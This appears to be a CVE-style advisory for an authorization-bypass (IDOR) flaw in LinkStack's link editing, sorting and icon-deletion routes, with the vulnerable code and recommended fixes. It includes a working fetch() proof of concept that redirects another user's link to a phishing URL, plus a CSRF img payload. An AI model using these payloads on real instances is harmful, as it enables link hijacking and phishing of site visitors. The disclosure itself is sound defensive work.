# CVE Report: Insecure Direct Object Reference (IDOR) in Link Management in LinkStackOrg/LinkStack

## Vulnerability Summary

| Field | Value |
|-------|-------|
| **Product** | LinkStack (LinkStackOrg/linkstack) |
| **Affected Version** | <= 4.8.6 (all versions) |
| **Vulnerability Type** | CWE-639: Authorization Bypass Through User-Controlled Key |
| **Attack Vector** | Network (Remote) |
| **Authentication Required** | Low (any registered user) |
| **User Interaction** | None |
| **CVSS 3.1 Base Score** | 8.1 (High) |
| **CVSS 3.1 Vector** | AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H |

## Description

LinkStack is a self-hosted, open-source link management platform built on Laravel 9. Several link management endpoints accept user-supplied link IDs without verifying that the authenticated user owns the targeted link. The application has an ownership-checking middleware (`LinkId`) that correctly validates ownership, but it is not applied to all routes that modify links. This allows any authenticated user to modify, reorder, or delete icons for any other user's links by providing an arbitrary link ID.

## Affected Endpoints

### 1. `POST /studio/edit-link` — Modify Any User's Link (CRITICAL)

**Route:** `routes/web.php`, line 104
```php
Route::post('/studio/edit-link', [UserController::class, 'saveLink'])->name('addLink');
// No link-id middleware
```

**Vulnerable Code:** `app/Http/Controllers/UserController.php`, lines 267-298
```php
$OrigLink = Link::find($request->linkid); // No ownership check
if ($OrigLink) {
    $currentValues = $OrigLink->getAttributes();
    $nonNullFilteredLinkData = array_filter($filteredLinkData, function($value) {return !is_null($value);});
    $updatedValues = array_merge($currentValues, $nonNullFilteredLinkData);
    $OrigLink->update($updatedValues); // Updates ANY link regardless of owner
}
```

**Impact:** An attacker can change any user's link URL, title, and metadata. This enables phishing by redirecting a victim's links to malicious URLs.

### 2. `POST /studio/sort-link` — Reorder Any User's Links (MEDIUM)

**Route:** `routes/web.php`, line 106
```php
Route::post('/studio/sort-link', [UserController::class, 'sortLinks'])->name('sortLinks');
// No link-id middleware
```

**Vulnerable Code:** `app/Http/Controllers/UserController.php`, lines 337-340
```php
Link::where("id", $linkId)
    ->update([
        'order' => $newOrder // No user_id check
    ]);
```

**Impact:** An attacker can scramble any user's link page layout by reordering their links.

### 3. `GET /clearIcon/{id}` — Delete Any User's Link Icon (MEDIUM)

**Route:** `routes/web.php`, line 123
```php
Route::get('/clearIcon/{id}', [UserController::class, 'clearIcon'])->name('clearIcon');
// No link-id middleware
```

**Vulnerable Code:** `app/Http/Controllers/UserController.php`, lines 460-474
```php
$linkId = $request->id; // No ownership verification
$directory = base_path("assets/favicon/icons");
$files = scandir($directory);
foreach($files as $file) {
    if (strpos($file, $linkId.".") !== false) {
        $pathinfo = pathinfo($file, PATHINFO_EXTENSION);
    }
}
if (isset($pathinfo)) {
    try{File::delete(base_path("assets/favicon/icons")."/".$linkId.".".$pathinfo);} catch (exception $e) {}
}
```

**Impact:** An attacker can delete any user's custom link icons. As a GET request, this is also exploitable via CSRF (e.g., `<img src="/clearIcon/153589040">`).

## Root Cause

The application has an ownership middleware (`app/Http/Middleware/LinkId.php`) that correctly validates link ownership:

```php
public function handle($request, Closure $next)
{
    $linkId = $request->route('id');
    $user = Auth::user();
    $link = Link::find($linkId);

    if (!$link) {
        return abort(404);
    }

    if ($user->id != $link->user_id) {
        return abort(403);
    }

    return $next($request);
}
```

However, this middleware is **only applied to some routes**. The following routes correctly use it:

- `GET /deleteLink/{id}` — has `link-id` middleware
- `GET /upLink/{up}/{id}` — has `link-id` middleware
- `POST /studio/edit-link/{id}` — has `link-id` middleware
- `GET /studio/button-editor/{id}` — has `link-id` middleware

While the three vulnerable routes listed above do not.

## Impact

An attacker with a regular user account can:

- **Hijack any user's links** — redirect them to phishing, malware, or defacement pages
- **Silently modify link targets** — victims and their audiences would not notice the change
- **Disrupt any user's page** — scramble link ordering or delete custom icons
- **Mass defacement** — enumerate link IDs and modify all links across the platform

Link IDs are visible in public page source code, making enumeration trivial.

## Proof of Concept

### Prerequisites

- A LinkStack instance with two user accounts (attacker and victim)
- The victim has at least one link (in this example, link ID `153589040`)

### Step 1: Login as attacker and obtain session

Create two users one as the admin and one as a regular user.

Visit /admin/users to create another user. Click on Add a new user on the bottom. 

<img width="1456" height="847" alt="image" src="https://github.com/user-attachments/assets/98fe1036-4801-4406-9c38-2a6162bbe008" />

After creating the user, click on pending to verify the user.

Create a link on the admin account and grab the links id by clicking on edit, it will be in the url.

<img width="1035" height="835" alt="image" src="https://github.com/user-attachments/assets/10ebadd4-22d6-4d56-a5a4-5a53fe15d0cd" />

<img width="684" height="317" alt="image" src="https://github.com/user-attachments/assets/e84e5c11-90a8-4cab-8b5b-ef9b872fee4e" />

<img width="643" height="364" alt="image" src="https://github.com/user-attachments/assets/7fe74a3f-0ba8-4d52-9148-9e81162bfdb8" />




### Step 2: Overwrite victim's link

Login as the non-admin user.

Open the browser developer console (F12) while logged in as the attacker and execute:

```javascript
fetch('/studio/edit-link', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
  },
  body: new URLSearchParams({
    linkid: '946500709',
    link: 'https://evil-phishing-site.com',
    title: 'HACKED BY ATTACKER',
    typename: 'link',
    button: 'custom_website'
  })
}).then(r => console.log('Status:', r.status))
```

<img width="1670" height="853" alt="image" src="https://github.com/user-attachments/assets/e3d2a405-6ff8-4490-ae2d-38c5811e02ec" />


### Step 3: Verify

Log back in as the admin. The victim's link now displays "HACKED BY ATTACKER" and points to `https://evil-phishing-site.com`.

<img width="1668" height="731" alt="image" src="https://github.com/user-attachments/assets/cc1c79a0-d95e-471e-8b6b-0eddf252a2fa" />

## Preconditions

- The attacker must have a registered account (registration is enabled by default)
- The attacker must know the victim's link ID (discoverable from public page source)
- No special server configuration is required — the vulnerability exists in the default installation

## Recommended Fix

Apply the existing `link-id` middleware to the unprotected routes:

```php
// Before (vulnerable)
Route::post('/studio/edit-link', [UserController::class, 'saveLink'])->name('addLink');
Route::post('/studio/sort-link', [UserController::class, 'sortLinks'])->name('sortLinks');
Route::get('/clearIcon/{id}', [UserController::class, 'clearIcon'])->name('clearIcon');

// After (fixed)
Route::post('/studio/edit-link', [UserController::class, 'saveLink'])->name('addLink')->middleware('link-id');
Route::post('/studio/sort-link', [UserController::class, 'sortLinks'])->name('sortLinks')->middleware('link-id');
Route::get('/clearIcon/{id}', [UserController::class, 'clearIcon'])->name('clearIcon')->middleware('link-id');
```

Additionally, for `saveLink`, the link ID is passed in the request body as `linkid` rather than as a route parameter. The `LinkId` middleware reads from `$request->route('id')`, so the middleware would also need to be updated to check `$request->input('linkid')` for this route, or the controller should add an explicit ownership check:

```php
$OrigLink = Link::find($request->linkid);
if ($OrigLink && $OrigLink->user_id !== Auth::user()->id) {
    abort(403);
}
```

For `sortLinks`, add a `user_id` where clause:

```php
Link::where("id", $linkId)
    ->where("user_id", Auth::user()->id) // Add ownership check
    ->update(['order' => $newOrder]);
```

## Timeline

| Date | Event |
|------|-------|
| 2026-04-09 | Vulnerability discovered |
| 2026-04-09 | PoC developed and tested against version 4.8.6 |

## References

- https://github.com/LinkStackOrg/LinkStack
- CWE-639: https://cwe.mitre.org/data/definitions/639.html
- OWASP IDOR: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
